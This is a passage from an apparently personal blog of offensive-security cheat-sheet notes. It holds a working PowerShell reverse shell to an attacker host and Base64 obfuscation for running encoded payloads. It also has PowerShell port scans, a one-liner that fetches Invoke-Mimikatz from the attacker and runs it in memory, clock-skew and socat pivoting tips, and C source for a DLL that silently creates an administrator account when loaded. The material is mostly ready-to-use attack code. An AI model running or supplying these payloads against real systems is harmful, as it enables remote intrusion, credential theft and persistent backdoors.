<div class="highlight"><pre><span></span><code><span class="nv">$client</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">Net</span><span class="p">.</span><span class="n">Sockets</span><span class="p">.</span><span class="n">TCPClient</span><span class="p">(</span><span class="s1">'&lt;attacker ip&gt;'</span><span class="p">,&lt;</span><span class="n">attacker</span> <span class="n">port</span><span class="p">&gt;);</span><span class="nv">$stream</span> <span class="p">=</span> <span class="nv">$client</span><span class="p">.</span><span class="n">GetStream</span><span class="p">();</span><span class="no">[byte[]]</span><span class="nv">$bytes</span> <span class="p">=</span> <span class="n">0</span><span class="p">..</span><span class="n">65535</span><span class="p">|%{</span><span class="n">0</span><span class="p">};</span><span class="k">while</span><span class="p">((</span><span class="nv">$i</span><span class="p">=</span> <span class="nv">$stream</span><span class="p">.</span><span class="n">Read</span><span class="p">(</span><span class="nv">$bytes</span><span class="p">,</span> <span class="n">0</span><span class="p">,</span> <span class="nv">$bytes</span><span class="p">.</span><span class="n">Length</span><span class="p">))</span> <span class="o">-ne</span> <span class="n">0</span><span class="p">){;</span><span class="nv">$data</span> <span class="p">=</span> <span class="p">(</span><span class="nb">New-Object</span> <span class="n">-TypeName</span> <span class="n">System</span><span class="p">.</span><span class="n">Text</span><span class="p">.</span><span class="n">ASCIIEncoding</span><span class="p">).</span><span class="n">GetString</span><span class="p">(</span><span class="nv">$bytes</span><span class="p">,</span><span class="n">0</span><span class="p">,</span> <span class="nv">$i</span><span class="p">);</span><span class="nv">$sendback</span><span class="p">=</span> <span class="p">(</span><span class="nb">iex </span><span class="nv">$data</span> <span class="n">2</span><span class="p">&gt;&amp;</span><span class="n">1</span> <span class="p">|</span> <span class="nb">Out-String</span> <span class="p">);</span><span class="nv">$sendback2</span>  <span class="p">=</span> <span class="nv">$sendback</span> <span class="p">+</span> <span class="s1">'PS '</span> <span class="p">+</span> <span class="p">(</span><span class="n">pwd</span><span class="p">).</span><span class="n">Path</span> <span class="p">+</span> <span class="s1">'&gt; '</span><span class="p">;</span><span class="nv">$sendbyte</span> <span class="p">=(</span><span class="no">[text.encoding]</span><span class="p">::</span><span class="n">ASCII</span><span class="p">).</span><span class="n">GetBytes</span><span class="p">(</span><span class="nv">$sendback2</span><span class="p">);</span><span class="nv">$stream</span><span class="p">.</span><span class="n">Write</span><span class="p">(</span><span class="nv">$sendbyte</span><span class="p">,</span><span class="n">0</span><span class="p">,</span><span class="nv">$sendbyte</span><span class="p">.</span><span class="n">Length</span><span class="p">);</span><span class="nv">$stream</span><span class="p">.</span><span class="n">Flush</span><span class="p">()};</span><span class="nv">$client</span><span class="p">.</span><span class="n">Close</span><span class="p">()</span>
</code></pre></div>
<p>Prepare and execute Base64 obfuscated reverse shell:</p>
<div class="highlight"><pre><span></span><code><span class="c"># Base64 Encode unicode string</span>
<span class="no">[System.Convert]</span><span class="p">::</span><span class="n">ToBase64String</span><span class="p">(</span><span class="no">[System.Text.Encoding]</span><span class="p">::</span><span class="n">Unicode</span><span class="p">.</span><span class="n">GetBytes</span><span class="p">(</span><span class="s1">'&lt;string payload&gt;'</span><span class="p">)</span>

<span class="c"># Base64 Encode unicode file content</span>
<span class="no">[System.Convert]</span><span class="p">::</span><span class="n">ToBase64String</span><span class="p">((</span><span class="no">[System.Text.Encoding]</span><span class="p">::</span><span class="n">Unicode</span><span class="p">.</span><span class="n">GetBytes</span><span class="p">(</span><span class="no">[System.Text.Encoding]</span><span class="p">::</span><span class="n">UTF8</span><span class="p">.</span><span class="n">GetString</span><span class="p">(</span><span class="no">[System.IO.File]</span><span class="p">::</span><span class="n">ReadAllBytes</span><span class="p">(</span><span class="s1">'&lt;file to encode&gt;'</span><span class="p">)))))</span>

<span class="c"># Run encoded command</span>
<span class="n">powershell</span> <span class="n">-e</span> <span class="p">&lt;</span><span class="n">encoded</span> <span class="n">command</span><span class="p">&gt;</span>
</code></pre></div>
<p><strong>Note</strong>: Must read strings with Unicode encoding!</p>
<p>Same can be achieved in Linux using <code>iconv</code>:</p>
<div class="highlight"><pre><span></span><code>iconv<span class="w"> </span>-f<span class="w"> </span>UTF-8<span class="w"> </span>-t<span class="w"> </span>UTF-16LE<span class="w"> </span><span class="s2">"&lt;file to encode&gt;"</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>base64<span class="w"> </span>-w0
</code></pre></div>
<p>Scan open TCP ports with PowerShell:</p>
<div class="highlight"><pre><span></span><code><span class="n">1</span><span class="p">..</span><span class="n">1024</span> <span class="p">|</span> <span class="p">%</span> <span class="p">{</span><span class="nb">echo </span><span class="p">((</span><span class="nb">new-object</span> <span class="n">Net</span><span class="p">.</span><span class="n">Sockets</span><span class="p">.</span><span class="n">TcpClient</span><span class="p">).</span><span class="n">Connect</span><span class="p">(</span><span class="s2">"&lt;Target Machine&gt;"</span><span class="p">,</span><span class="nv">$_</span><span class="p">))</span> <span class="s2">"Port $_ is open!"</span><span class="p">}</span> <span class="n">2</span><span class="p">&gt;</span><span class="nv">$null</span>

<span class="n">1</span><span class="p">..</span><span class="n">20</span> <span class="p">|</span> <span class="p">%</span> <span class="p">{</span> <span class="nv">$a</span> <span class="p">=</span> <span class="nv">$_</span><span class="p">;</span> <span class="nb">write-host</span> <span class="s2">"------"</span><span class="p">;</span> <span class="nb">write-host</span> <span class="s2">"10.0.0.$a"</span><span class="p">;</span> <span class="n">22</span><span class="p">,</span><span class="n">53</span><span class="p">,</span><span class="n">80</span><span class="p">,</span><span class="n">445</span> <span class="p">|</span> <span class="p">%</span> <span class="p">{</span><span class="nb">echo </span><span class="p">((</span><span class="nb">new-object</span> <span class="n">Net</span><span class="p">.</span><span class="n">Sockets</span><span class="p">.</span><span class="n">TcpClient</span><span class="p">).</span><span class="n">Connect</span><span class="p">(</span><span class="s2">"10.1.1.$a"</span><span class="p">,</span><span class="nv">$_</span><span class="p">))</span> <span class="s2">"Port $_ is open!"</span><span class="p">}</span> <span class="n">2</span><span class="p">&gt;</span><span class="nv">$null</span><span class="p">}</span>
</code></pre></div>
<p>Use PowerSploit's <code>Invoke-Mimikatz.ps1</code> script to run mimikatz in memory:</p>
<div class="highlight"><pre><span></span><code><span class="nb">iex </span><span class="p">(</span><span class="nb">iwr </span><span class="n">-UseBasicParsing</span> <span class="n">http</span><span class="p">://&lt;</span><span class="n">attacker</span> <span class="n">ip</span><span class="p">&gt;/</span><span class="nb">Invoke-Mimikatz</span><span class="p">.</span><span class="n">ps1</span><span class="p">)</span>
</code></pre></div>
<div class="highlight"><pre><span></span><code><span class="c"># Run any mimikatz command</span>
<span class="n">Inovke-Mimikatz</span> <span class="n">-Command</span> <span class="s2">"&lt;mimikatz command(s)&gt;"</span>
</code></pre></div>
<p>If the "AmbiguousMatchException" is raised, try to patch the <code>Invoke-Mimikatz.ps1</code> script as follows:</p>
<ul>
<li>Change the following line:   <code>$GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress')</code></li>
<li>To: <code>$GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress', [reflection.bindingflags] "Public,Static", $null, [System.Reflection.CallingConventions]::Any, @((New-Object System.Runtime.InteropServices.HandleRef).GetType(), [string]), $null);</code></li>
</ul>
<p>Reference: <a href="https://github.com/mitre/caldera/issues/38#issuecomment-396055260">https://github.com/mitre/caldera/issues/38#issuecomment-396055260</a></p>
<h3 id="clock-skew">Clock Skew</h3>
<p>If "Clock skew too great" error is obtained, sync the attacking machine with the DC:</p>
<div class="highlight"><pre><span></span><code>ntpdate<span class="w"> </span>&lt;DC<span class="w"> </span>IP&gt;
</code></pre></div>
<p>or use <code>faketime</code> when launching <code>GetUserSPNs</code> script (useful when cannot update attacking machine system date):</p>
<div class="highlight"><pre><span></span><code>faketime<span class="w"> </span><span class="s2">"</span><span class="k">$(</span>sudo<span class="w"> </span>ntpdate<span class="w"> </span>&lt;DC<span class="w"> </span>IP&gt;<span class="w"> </span><span class="m">2</span>&gt;/dev/null<span class="w"> </span><span class="p">|</span><span class="w"> </span>cut<span class="w"> </span>-d<span class="w"> </span><span class="s1">'('</span><span class="w"> </span>-f<span class="w"> </span><span class="m">1</span><span class="k">)</span><span class="s2">"</span>
</code></pre></div>
<p>If working in a pivoted scenario and the NTP is not directly reachable, pivot UDP port <code>123</code> with <code>socat</code>:</p>
<div class="highlight"><pre><span></span><code><span class="c1"># On pivot machine</span>
socat<span class="w"> </span>TCP4-LISTEN:5555,fork<span class="w"> </span>UDP4:&lt;DC-IP&gt;:123

<span class="c1"># On attacker machine</span>
socat<span class="w"> </span>-T15<span class="w"> </span>UDP4-LISTEN:123,fork<span class="w"> </span>TCP4:&lt;Relay-IP&gt;:5555
ntpdate<span class="w"> </span>&lt;attacker<span class="w"> </span>machine<span class="w"> </span>ip&gt;
</code></pre></div>
<h3 id="dlls">DLLs</h3>
<p>Generic DLL template:</p>
<div class="highlight"><pre><span></span><code><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;windows.h&gt;</span><span class="c1"> </span>

<span class="kt">int</span><span class="w"> </span><span class="nf">doSomeAction</span><span class="p">()</span>
<span class="p">{</span>
<span class="w">    </span><span class="c1">// Implement something cool</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>

<span class="n">BOOL</span><span class="w"> </span><span class="n">APIENTRY</span><span class="w"> </span><span class="n">DllMain</span><span class="p">(</span><span class="n">HMODULE</span><span class="w"> </span><span class="n">hModule</span><span class="p">,</span>
<span class="w">    </span><span class="n">DWORD</span><span class="w"> </span><span class="n">ul_reason_for_call</span><span class="p">,</span>
<span class="w">    </span><span class="n">LPVOID</span><span class="w"> </span><span class="n">lpReserved</span>
<span class="p">)</span>
<span class="p">{</span>
<span class="w">    </span><span class="k">switch</span><span class="w"> </span><span class="p">(</span><span class="n">ul_reason_for_call</span><span class="p">)</span>
<span class="w">    </span><span class="p">{</span>
<span class="w">    </span><span class="k">case</span><span class="w"> </span><span class="no">DLL_PROCESS_ATTACH</span><span class="p">:</span>
<span class="w">        </span><span class="n">doSomeAction</span><span class="p">();</span>
<span class="w">        </span><span class="k">break</span><span class="p">;</span>
<span class="w">    </span><span class="k">case</span><span class="w"> </span><span class="no">DLL_THREAD_ATTACH</span><span class="p">:</span>
<span class="w">    </span><span class="k">case</span><span class="w"> </span><span class="no">DLL_THREAD_DETACH</span><span class="p">:</span>
<span class="w">    </span><span class="k">case</span><span class="w"> </span><span class="no">DLL_PROCESS_DETACH</span><span class="p">:</span>
<span class="w">        </span><span class="k">break</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">TRUE</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div>
<p>DLL template script to programatically add user (as administrator):</p>
<div class="highlight"><pre><span></span><code><span class="cp">#pragma comment(lib, "Netapi32.lib")</span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;windows.h&gt;</span><span class="c1"> </span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;lm.h&gt;</span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span>

<span class="kt">void</span><span class="w"> </span><span class="nf">AddUserToWindows</span><span class="p">(</span><span class="k">const</span><span class="w"> </span><span class="kt">wchar_t</span><span class="w"> </span><span class="o">*</span><span class="n">username</span><span class="p">,</span><span class="w"> </span><span class="k">const</span><span class="w"> </span><span class="kt">wchar_t</span><span class="w"> </span><span class="o">*</span><span class="n">password</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="n">USER_INFO_1</span><span class="w"> </span><span class="n">ui</span><span class="p">;</span>
<span class="w">    </span><span class="n">DWORD</span><span class="w"> </span><span class="n">dwError</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>

<span class="w">    </span><span class="c1">// Initialize user information</span>
<span class="w">    </span><span class="n">ui</span><span class="p">.</span><span class="n">usri1_name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">LPWSTR</span><span class="p">)</span><span class="n">username</span><span class="p">;</span>
<span class="w">    </span><span class="n">ui</span><span class="p">.</span><span class="n">usri1_password</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">LPWSTR</span><span class="p">)</span><span class="n">password</span><span class="p">;</span>
<span class="w">    </span><span class="n">ui</span><span class="p">.</span><span class="n">usri1_priv</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">USER_PRIV_USER</span><span class="p">;</span><span class="w">  </span><span class="c1">// Standard user (not admin by default)</span>
<span class="w">    </span><span class="n">ui</span><span class="p">.</span><span class="n">usri1_home_dir</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">NULL</span><span class="p">;</span>
<span class="w">    </span><span class="n">ui</span><span class="p">.</span><span class="n">usri1_comment</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">NULL</span><span class="p">;</span>
<span class="w">    </span><span class="n">ui</span><span class="p">.</span><span class="n">usri1_flags</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">UF_SCRIPT</span><span class="p">;</span><span class="w"> </span><span class="c1">// Default user settings</span>
<span class="w">    </span><span class="n">ui</span><span class="p">.</span><span class="n">usri1_script_path</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">NULL</span><span class="p">;</span>

<span class="w">    </span><span class="c1">// Add user</span>
<span class="w">    </span><span class="n">NET_API_STATUS</span><span class="w"> </span><span class="n">status</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">NetUserAdd</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="n">LPBYTE</span><span class="p">)</span><span class="o">&amp;</span><span class="n">ui</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">dwError</span><span class="p">);</span>

<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">status</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">NERR_Success</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="n">wprintf</span><span class="p">(</span><span class="sa">L</span><span class="s">"User '%s' added successfully.</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="w"> </span><span class="n">username</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="n">wprintf</span><span class="p">(</span><span class="sa">L</span><span class="s">"Failed to add user. Error code: %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="w"> </span><span class="n">status</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">}</span>

<span class="kt">void</span><span class="w"> </span><span class="nf">AddUserToGroup</span><span class="p">(</span><span class="k">const</span><span class="w"> </span><span class="kt">wchar_t</span><span class="w"> </span><span class="o">*</span><span class="n">username</span><span class="p">,</span><span class="w"> </span><span class="k">const</span><span class="w"> </span><span class="kt">wchar_t</span><span class="w"> </span><span class="o">*</span><span class="n">group</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="n">LOCALGROUP_MEMBERS_INFO_3</span><span class="w"> </span><span class="n">lgmi</span><span class="p">;</span>
<span class="w">    </span><span class="n">lgmi</span><span class="p">.</span><span class="n">lgrmi3_domainandname</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">LPWSTR</span><span class="p">)</span><span class="n">username</span><span class="p">;</span>

<span class="w">    </span><span class="c1">// Add user to the specified group</span>
<span class="w">    </span><span class="n">NET_API_STATUS</span><span class="w"> </span><span class="n">status</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">NetLocalGroupAddMembers</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="n">group</span><span class="p">,</span><span class="w"> </span><span class="mi">3</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="n">LPBYTE</span><span class="p">)</span><span class="o">&amp;</span><span class="n">lgmi</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="p">);</span>

<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">status</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">NERR_Success</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="n">wprintf</span><span class="p">(</span><span class="sa">L</span><span class="s">"User '%s' added to group '%s' successfully.</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="w"> </span><span class="n">username</span><span class="p">,</span><span class="w"> </span><span class="n">group</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="n">wprintf</span><span class="p">(</span><span class="sa">L</span><span class="s">"Failed to add user to group '%s'. Error code: %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="w"> </span><span class="n">group</span><span class="p">,</span><span class="w"> </span><span class="n">status</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">}</span>

<span class="kt">int</span><span class="w"> </span><span class="nf">doSomeAction</span><span class="p">()</span>
<span class="p">{</span>
<span class="w">    </span><span class="k">const</span><span class="w"> </span><span class="kt">wchar_t</span><span class="w"> </span><span class="o">*</span><span class="n">username</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sa">L</span><span class="s">"&lt;new username&gt;"</span><span class="p">;</span><span class="w">  </span><span class="c1">// Change this to the desired username</span>
<span class="w">    </span><span class="k">const</span><span class="w"> </span><span class="kt">wchar_t</span><span class="w"> </span><span class="o">*</span><span class="n">password</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sa">L</span><span class="s">"&lt;password&gt;"</span><span class="p">;</span><span class="w"> </span><span class="c1">// Change to a secure password</span>
<span class="w">    </span><span class="k">const</span><span class="w"> </span><span class="kt">wchar_t</span><span class="w"> </span><span class="o">*</span><span class="n">group</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sa">L</span><span class="s">"Administrators"</span><span class="p">;</span><span class="w">   </span><span class="c1">// Add user to Administrators group</span>

<span class="w">    </span><span class="c1">// Add the user</span>
<span class="w">    </span><span class="n">AddUserToWindows</span><span class="p">(</span><span class="n">username</span><span class="p">,</span><span class="w"> </span><span class="n">password</span><span class="p">);</span>

<span class="w">    </span><span class="c1">// Add user to the "Administrators" group</span>
<span class="w">    </span><span class="n">AddUserToGroup</span><span class="p">(</span><span class="n">username</span><span class="p">,</span><span class="w"> </span><span class="n">group</span><span class="p">);</span>

<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>

<span class="n">BOOL</span><span class="w"> </span><span class="n">APIENTRY</span><span class="w"> </span><span class="n">DllMain</span><span class="p">(</span><span class="n">HMODULE</span><span class="w"> </span><span class="n">hModule</span><span class="p">,</span>
<span class="w">    </span><span class="n">DWORD</span><span class="w"> </span><span class="n">ul_reason_for_call</span><span class="p">,</span>
<span class="w">    </span><span class="n">LPVOID</span><span class="w"> </span><span class="n">lpReserved</span>
<span class="p">)</span>
<span class="p">{</span>
<span class="w">    </span><span class="k">switch</span><span class="w"> </span><span class="p">(</span><span class="n">ul_reason_for_call</span><span class="p">)</span>
<span class="w">    </span><span class="p">{</span>
<span class="w">    </span><span class="k">case</span><span class="w"> </span><span class="no">DLL_PROCESS_ATTACH</span><span class="p">:</span>
<span class="w">        </span><span class="n">doSomeAction</span><span class="p">();</span>
<span class="w">        </span><span class="k">break</span><span class="p">;</span>
<span class="w">    </span><span class="k">case</span><span class="w"> </span><span class="no">DLL_THREAD_ATTACH</span><span class="p">:</span>
<span class="w">    </span><span class="k">case</span><span class="w"> </span><span class="no">DLL_THREAD_DETACH</span><span class="p">:</span>
<span class="w">    </span><span class="k">case</span><span class="w"> </span><span class="no">DLL_PROCESS_DETACH</span><span class="p">:</span>
<span class="w">        </span><span class="k">break</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">TRUE</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div>
<p>Compile DLL:</p>
<div class="highlight"><pre><span></span><code>x86_64-w64-mingw32-gcc<span class="w"> </span>-shared<span class="w"> </span>-o<span class="w"> </span>&lt;output<span class="w"> </span>dll<span class="w"> </span>path&gt;<span class="w"> </span>&lt;input<span class="w"> </span>.c<span class="w"> </span>file&gt;<span class="w"> </span><span class="o">[</span>-lnetapi32<span class="o">]</span>
</code></pre></div>
<p><strong>Note</strong>:</p>
<ul>
<li><code>-lnetapi32</code> is required when using functions from <code>Netapi32.lib</code></li>
</ul>
  </div>
  <div class="tag-cloud">
    <p>
    </p>
  </div>






</article>

<footer>
<p>&copy; Jack69 - 2025 </p>
<p>
Built with <a href="http://getpelican.com" target="_blank">Pelican</a> using <a href="http://bit.ly/flex-pelican" target="_blank">Flex</a> theme
  <span class="footer-separator">|</span>
  Switch to the <a href="javascript:void(0)" onclick="theme.switch(`dark`)">dark</a> | <a href="javascript:void(0)" onclick="theme.switch(`light`)">light</a> | <a href="javascript:void(0)" onclick="theme.switch(`browser`)">browser</a> theme
  <script id="dark-theme-script"
          src="https://ojack69.github.io/jacks-corner/theme/dark-theme/dark-theme.min.js"
          data-enable-auto-detect-theme="True"
          data-default-theme="dark"
          type="text/javascript">
  </script>
</p></footer>  </main>

<script type="application/ld+json">
{
  "@context" : "http://schema.org",
  "@type" : "Blog",
  "name": " Jack's Corner ",
  "url" : "https://ojack69.github.io/jacks-corner",
  "image": "",
  "description": "My personal notes on stuff I like, nothing special"
}
</script>  <script>
    window.loadStorkIndex = function () {
      stork.initialize("https://ojack69.github.io/jacks-corner/theme/stork/stork.wasm")
      stork.register("sitesearch", "https://ojack69.github.io/jacks-corner/search-index.st", { showProgress: false });
    }
  </script>
  <script src="https://ojack69.github.io/jacks-corner/theme/stork/stork.js"></script>

</body>
</html>